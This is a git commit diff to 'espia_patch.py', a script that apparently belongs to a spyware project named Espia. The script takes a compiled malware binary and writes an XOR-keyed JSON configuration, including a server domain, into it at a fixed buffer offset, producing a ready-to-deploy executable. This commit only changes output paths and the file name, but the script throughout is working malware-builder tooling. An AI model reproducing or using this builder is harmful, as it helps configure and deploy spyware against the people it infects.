31f2a972ae001103301eacf7d6d1655162a44046
P@ko <tomp12@protonmail.com>
2021-12-11 11:00:48 -0800

    Update espia_patch.py

--- espia_server/app/scripts/espia_patch.py
+++ espia_server/app/scripts/espia_patch.py
@@ -1,13 +1,12 @@
 import json
-import random
 import shutil
 from pathlib import Path
 
 _MALWARE_CONFIG_BUFFER = 1000
 _COMPILED_MALWARE_PATH = "<Malware original binary path>"
-_PATCHED_FILES_PATH = 'patched_files'
+_PATCHED_FILES_DIR = Path('../static_files')
 _BEGIN_OF_CONFIG_SUFFIX = '{"Domain":'
-_PATCHED_FILE_NAME = f'Espia_patch{random.randint(1000, 99999)}.exe'
+_PATCHED_FILE_NAME = f'Espia.exe'
 _XOR_KEY = "Q"
 _CONFIG = {
     "Domain": "<Server hostname\domain for products>",
@@ -21,11 +20,10 @@ def xor(data):
 
 
 exe_file = Path(_COMPILED_MALWARE_PATH)
-patched_files_dir = Path('patched_files')
-patched_file_path = patched_files_dir / _PATCHED_FILE_NAME
+patched_file_path = _PATCHED_FILES_DIR / _PATCHED_FILE_NAME
 
 # Create generated exe files
-Path(_PATCHED_FILES_PATH).mkdir(exist_ok=True, parents=True)
+_PATCHED_FILES_DIR.mkdir(exist_ok=True, parents=True)
 
 json_config = json.dumps(_CONFIG).encode()
 padding = b"\x00" * (_MALWARE_CONFIG_BUFFER - len(json_config))
@@ -44,4 +42,4 @@ with open(patched_file_path, 'r+b') as bin_file:
     bin_file.seek(offset)
     bin_file.write(json_config)
 
-print(f"[+] Finished patching file: {_PATCHED_FILES_PATH} / {_PATCHED_FILE_NAME}, offset: {offset}")
+print(f"[+] Finished patching file: {_PATCHED_FILES_DIR.name} / {_PATCHED_FILE_NAME}, offset: {offset}")
